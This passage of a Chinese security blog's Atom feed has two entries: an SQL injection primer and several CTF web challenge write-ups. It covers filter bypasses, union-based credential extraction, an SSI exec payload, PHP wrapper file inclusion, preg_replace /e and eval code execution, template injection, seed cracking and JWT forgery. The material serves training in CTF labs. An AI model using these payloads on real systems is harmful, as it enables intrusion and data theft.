<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>d0ud</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-09-13T10:12:33.015Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>d0ud</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://example.com/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2023-09-13T09:08:37.671Z</published>
    <updated>2023-09-13T10:12:33.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入中的可利用的库表和列"><a href="#SQL注入中的可利用的库表和列" class="headerlink" title="SQL注入中的可利用的库表和列"></a>SQL注入中的可利用的库表和列</h1><p><code>information_schema.tables</code> <em>所有库和表的统计</em></p><pre><code>table_schema  table_name  </code></pre><p><code>information_schema.columns</code> <em>包含库名，表名，列名</em></p><pre><code>table_schema table_namecolumn_name</code></pre><p><code>mysql.innodb_table_stats</code></p><pre><code> table_name  database_name</code></pre><p><code>mysql.innodb_index_stats</code> </p><pre><code>table_name database_name</code></pre><p><code>sys.schema_table_statistics</code> </p><pre><code>table_schema table_name</code></pre><p><code>sys.schema_table_statistics_with_buffer</code> </p><pre><code>table_schema table_name</code></pre><p><code>sys.schema_auto_increment_columns</code> </p><pre><code>table_schema table_name</code></pre><h1 id="注入前的基本功"><a href="#注入前的基本功" class="headerlink" title="注入前的基本功"></a>注入前的基本功</h1><h2 id="何种注入类型"><a href="#何种注入类型" class="headerlink" title="何种注入类型"></a>何种注入类型</h2><p>主要分为字符型注入和数字型注入</p><p>在注入点用单引号双引号或单纯数字测试即可得出</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>SQL语句的注释有 </p><p><code>#</code></p><p> <code>--</code></p><p> <code>/*.....*/</code></p><h2 id="查询的表有多少列"><a href="#查询的表有多少列" class="headerlink" title="查询的表有多少列"></a>查询的表有多少列</h2><p>在已经有注入点的前提下，利用<code>union</code>或者<code>order by</code>来判断列数</p><p><code>select a from b union select 1,2,3;</code></p><p>因为<code>union</code>要求上下两张表的列数相同，不同时则报错</p><p><code>select a from b order by 1;</code></p><p><code>order by</code>的作用是将查询的表根据某一列来排序，当需要用来排序的那一列不存在的时候就会报错</p><h2 id="关键字黑名单的绕过"><a href="#关键字黑名单的绕过" class="headerlink" title="关键字黑名单的绕过"></a>关键字黑名单的绕过</h2><ol><li>Tab和()可以用来代替空格</li><li>单次删除关键字可以采用双写绕过</li><li>多次删除关键字可以大小写并用来绕过</li><li>利用内联注释，即 <code>/*.....*/</code>也可以绕过部分关键字检测</li><li>利用<code>handler</code>来获取表的数据</li></ol><h2 id="handler的使用"><a href="#handler的使用" class="headerlink" title="handler的使用"></a>handler的使用</h2><pre><code>HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。通过HANDLER tbl_name CLOSE来关闭打开的句柄。通过索引去查看的话可以按照一定的顺序，获取表中的数据。通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。通过索引列指定一个值，可以指定从哪一行开始。通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</code></pre><p><code>handler</code>常见于过滤<code>selcet</code>的注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">handler</span> a <span class="token keyword">open</span><span class="token punctuation">;</span><span class="token keyword">handler</span> a <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="判断采用何种注入方法"><a href="#判断采用何种注入方法" class="headerlink" title="判断采用何种注入方法"></a>判断采用何种注入方法</h1><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>最简单的一种注入，利用<code>union</code>进行联合查询,</p><p><code>select a from b union select c from d;</code></p><p>当使用这种查询语句时，将会返回两张表，即a和c</p><p>a是已经固定查询的，<code>union</code>后面的就是我们的操作空间</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">首先，判断列数，假设是三列<span class="token keyword">select</span> a <span class="token keyword">from</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">;</span>则在此时报错，我们得知是三列获取关键信息，例如获取当前库下的所有表名<span class="token keyword">select</span> a <span class="token keyword">from</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> infromation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>从已知表名获取列名，假设我们已得知一表名为<span class="token string">'TA'</span><span class="token keyword">select</span> a <span class="token keyword">from</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> infromation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'TA'</span><span class="token punctuation">;</span>获取数据，假设我们得知列名为<span class="token string">'passwd'</span><span class="token keyword">select</span> a <span class="token keyword">from</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span> <span class="token keyword">from</span> TA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h1 id="尚在更新中"><a href="#尚在更新中" class="headerlink" title="尚在更新中"></a>尚在更新中</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入中的可利用的库表和列&quot;&gt;&lt;a href=&quot;#SQL注入中的可利用的库表和列&quot; class=&quot;headerlink&quot; title=&quot;SQL注入中的可利用的库表和列&quot;&gt;&lt;/a&gt;SQL注入中的可利用的库表和列&lt;/h1&gt;&lt;p&gt;&lt;code&gt;information_</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>一些CTF题解</title>
    <link href="http://example.com/%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/%E9%A2%98%E8%A7%A3/</id>
    <published>2023-09-07T01:23:53.518Z</published>
    <updated>2023-09-07T02:12:42.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lt-BJDCTF2020-gt-EasySearch-1"><a href="#lt-BJDCTF2020-gt-EasySearch-1" class="headerlink" title="&lt;BJDCTF2020&gt;EasySearch 1"></a>&lt;BJDCTF2020&gt;EasySearch 1</h1><p>扫描目录得到<code>index.php.swp</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'            ***            ***            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>            ******'</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">**</span><span class="token operator">*</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token punctuation">&#125;</span><span class="token operator">**</span><span class="token operator">*</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数<code>password</code>用于验证，用脚本可得到<code>password</code>应为<code>2020666</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> count<span class="token keyword">for</span> i <span class="token keyword">in</span> count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    passw <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    md<span class="token punctuation">.</span>update<span class="token punctuation">(</span>passw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hashid <span class="token operator">=</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> hashid<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'6d0bc1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>passw<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>username</code>用于写入文件<br>注意文件后缀为<code>shtml</code>，<code>shtml</code>文件是可以写入SSI指令的<br>成功写入后在响应头里可以得到文件路径</p><p>在网站根目录下找到文件<code>flag_990c66bf85a09c664f0b6741840499b2</code><br>最终payload为</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">username=<span class="token comment">&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></span>&amp;password=2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="lt-BJDCTF2020-gt-ZJCTF，不过如此"><a href="#lt-BJDCTF2020-gt-ZJCTF，不过如此" class="headerlink" title="&lt;BJDCTF2020&gt;ZJCTF，不过如此"></a>&lt;BJDCTF2020&gt;ZJCTF，不过如此</h1><p>打开题目，为源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然需要利用伪协议</p><p><code>/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p>对回显内容解码，得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>preg_replace/e</code>模式可执行代码的特性，传参为<code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code>，得到flag</p><p>具体可参考<code>paidx0</code>师傅的博客 <a href="https://blog.csdn.net/weixin_49656607/article/details/119833707">https://blog.csdn.net/weixin_49656607/article/details/119833707</a></p><h1 id="lt-CISCN2019-华东南赛区-gt-Web11"><a href="#lt-CISCN2019-华东南赛区-gt-Web11" class="headerlink" title="&lt;CISCN2019 华东南赛区&gt;Web11"></a>&lt;CISCN2019 华东南赛区&gt;Web11</h1><p>打开题目，一个不明所以的界面，重点在<code>get ip</code>和<code>xff</code>，显然，试试改动<code>xff</code>头，果然回显的当前ip地址为<code>xxf</code>头的值，那么，模板注入？</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<code>flag</code></p><h1 id="lt-GWCTF-2019-gt-枯燥的抽奖"><a href="#lt-GWCTF-2019-gt-枯燥的抽奖" class="headerlink" title="&lt;GWCTF 2019&gt;枯燥的抽奖"></a>&lt;GWCTF 2019&gt;枯燥的抽奖</h1><p>打开题目，从源码里发现<code>check.php</code><br>访问得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ljiUB7yF7i<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用了伪随机函数<code>mt_srand()</code>，虽然种子在服务端产生，但是是固定不变的，爆破种子推出<code>$str</code>即可</p><h1 id="lt-HFCTF2020-gt-EasyLogin"><a href="#lt-HFCTF2020-gt-EasyLogin" class="headerlink" title="&lt;HFCTF2020&gt;EasyLogin"></a>&lt;HFCTF2020&gt;EasyLogin</h1><p>打开题目，一个登录框，带有注册功能，尝试注册并登录后提示有<code>flag</code>，但无查看权限</p><p>那么显然我们需要以<code>admin</code>的身份登录，第一个方法是爆破密码，尝试了部分常见密码，无果。那么第二个方法，伪造登录凭证，<br>注册并登录，查看数据包，可以发现</p><p><img src="https://null-d0ud.github.io/img/HFCTF2020EasyLogin2.png"></p><p>很显然，<code>jwt</code>解密，得到</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;header&quot;:&#123;    &quot;alg&quot;:&quot;HS256&quot;    &quot;typ&quot;:&quot;JWT&quot;    &#125;    &quot;payload&quot;:&#123;    &quot;secretid&quot;:0    &quot;username&quot;:&quot;A&quot;    &quot;password&quot;:&quot;A&quot;    &quot;iat&quot;:1649828192    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造<code>jwt</code>即可</p><h1 id="lt-MRCTF2020-gt-PYWebsite"><a href="#lt-MRCTF2020-gt-PYWebsite" class="headerlink" title="&lt;MRCTF2020&gt;PYWebsite"></a>&lt;MRCTF2020&gt;PYWebsite</h1><p>打开题目，需要授权码获取<code>flag</code>,查看源码发现存在<code>flag.php</code>，直接访问，得到</p><blockquote><p>我已经把购买者的IP保存了，显然你没有购买</p><p>验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag</p></blockquote><p>修改请求头，添加<code>x-Forwarded-For:127.0.0.1</code>,得到<code>flag</code></p><h1 